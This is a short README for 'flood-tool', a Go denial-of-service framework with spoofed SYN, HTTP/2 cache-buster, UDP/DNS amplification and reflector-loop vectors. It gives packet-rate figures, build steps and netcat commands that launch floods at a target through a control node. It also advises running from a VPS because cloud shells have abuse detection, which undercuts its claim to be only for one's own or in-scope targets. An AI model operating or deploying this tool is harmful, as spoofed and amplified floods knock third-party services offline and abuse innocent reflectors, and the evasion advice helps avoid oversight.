# flood-tool

Multi-vector stress-testing framework — Go, Linux, raw socket.

## Vectors

| Vector | Fungsi | Requires |
|---|---|---|
| `syn` | TCP SYN flood spoof | sudo, CAP_NET_RAW |
| `http2` | HTTP/2 L7 flood (cache-buster) | user |
| `udp` | UDP spoof amplification single target | sudo |
| `reflector` | Loop spoof dari list reflector (baca reflectors.txt) | sudo |

## Status verifikasi

- 408k pps UDP spoof (terverifikasi, commit b493006)
- 2.7k pps SYN flood
- 5.8k req/s HTTP/2

## Build

    go build -o node_bin ./node
    go build -o ctl_bin ./ctl

## Run node

    sudo FLOOD_TOKEN=test ./node_bin -listen :9999 -token test

## Perintah

    echo 'test ping' | nc -w 2 127.0.0.1 9999
    echo 'test start {"vector":"udp","target":"TARGET_IP","port":53,"amp":"dns","workers":8}' | nc -w 3 127.0.0.1 9999
    echo 'test start {"vector":"reflector","target":"TARGET_IP","reflector_file":"reflectors.txt","workers":8}' | nc -w 3 127.0.0.1 9999
    echo 'test stop <ID>' | nc -w 2 127.0.0.1 9999

## Catatan

- Jalanin dari VPS, bukan Codespace/Cloud Shell — abuse detection aktif
- Raw socket butuh sudo
- Kode ini buat stress-test target sendiri / scope bounty. Bukan buat serang target asing.
